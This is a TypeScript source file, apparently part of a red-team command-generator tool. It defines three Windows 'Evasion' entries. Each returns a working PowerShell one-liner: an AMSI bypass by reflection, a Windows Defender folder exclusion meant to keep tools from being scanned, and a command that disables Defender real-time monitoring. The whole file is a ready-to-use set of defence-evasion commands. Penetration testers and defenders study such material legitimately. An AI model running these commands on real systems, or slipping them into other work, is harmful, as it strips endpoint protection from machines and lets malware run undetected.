import type { Tool } from '../../types';
import { createArg } from './common';

export const WINDOWS_TOOLS: Tool[] = [
    // --- WINDOWS -> EVASION ---
    {
        id: 'amsi_bypass',
        name: 'AMSI Bypass (Reflection)',
        category: 'WINDOWS',
        subcategory: 'Evasion',
        desc: 'Matt Graeber\'s classic reflection bypass to disable AMSI in the current PowerShell session.',
        authMode: 'none',
        generate: (v, args) => {
            return `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`;
        }
    },
    {
        id: 'defender_exclusion',
        name: 'Defender Exclusion (Path)',
        category: 'WINDOWS',
        subcategory: 'Evasion',
        desc: 'Add a folder exclusion to Windows Defender to prevent scanning of tools (Requires Admin).',
        authMode: 'none',
        args: [createArg.input('exclusionPath', 'Path', 'C:\\Temp', 'C:\\Path\\To\\Exclude')],
        generate: (v, args) => {
            return `Add-MpPreference -ExclusionPath "${args.exclusionPath || 'C:\\Temp'}"`;
        }
    },
    {
        id: 'disable_realtime_monitoring',
        name: 'Disable Real-time Monitor',
        category: 'WINDOWS',
        subcategory: 'Evasion',
        desc: 'Disable Windows Defender Real-time Monitoring completely (Requires Admin).',
        authMode: 'none',
        generate: (v, args) => {
            return `Set-MpPreference -DisableRealtimeMonitoring $true`;
        }
    },
];
